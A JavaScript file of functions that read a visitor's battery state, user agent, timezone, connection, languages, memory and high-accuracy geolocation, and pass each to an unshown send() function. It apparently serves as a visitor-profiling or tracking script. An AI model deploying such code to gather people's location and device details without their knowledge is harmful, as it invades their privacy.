async function battery()
{
    if ("getBattery" in navigator)
    {
        const battery = await navigator.getBattery();
        await send("battery", { charging: battery.charging, level: battery.level * 100 });
    }
}

async function ua()
{
    await send("ua", navigator.userAgent);
}

async function timezone()
{
    await send("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
}

async function connection()
{
    if ("connection" in navigator)
    {
        const { type, effectiveType, downlink } = navigator.connection;
        await send("connection", { type, effectiveType, downlink });
    }
}

async function language()
{
    await send("language", { language: navigator.language, languages: navigator.languages });
}

async function geo()
{
    if ("geolocation" in navigator)
    {
        navigator.geolocation.getCurrentPosition(

            async position =>
            {
                const { latitude, longitude } = position.coords;
                await send("geo", `https://www.google.ru/maps/@${latitude},${longitude},100m`);
            },
            null,
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }
}

async function ram()
{
    if ("deviceMemory" in navigator)
    {
        await send("ram", navigator.deviceMemory + "GB");
    }
}
